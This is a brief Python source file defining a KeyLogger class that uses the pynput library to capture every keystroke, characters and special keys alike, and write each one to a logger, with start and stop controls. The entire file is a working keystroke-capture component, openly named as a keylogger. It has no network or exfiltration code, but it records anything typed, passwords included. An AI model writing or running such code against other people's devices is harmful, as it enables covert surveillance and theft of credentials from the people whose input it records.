from pynput import keyboard

from util import setup_logger

class KeyLogger:
    def __init__(self, logger):
        self.logger = logger

        self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)

        self._active = False

    @property 
    def active(self):
        return self._active

    def start(self):
        if not self._active:
            self._active = True 
            self.logger.info("Start keylogger")
            self.keyboard_listener.start()
            

    def stop(self):
        if self._active:
            self._active = False 
            self.logger.info("Stop keylogger")

            self.keyboard_listener.stop()

    def on_key_press(self, key):
        try:
            self.logger.info(key.char)
        except AttributeError:
            self.logger.info(key)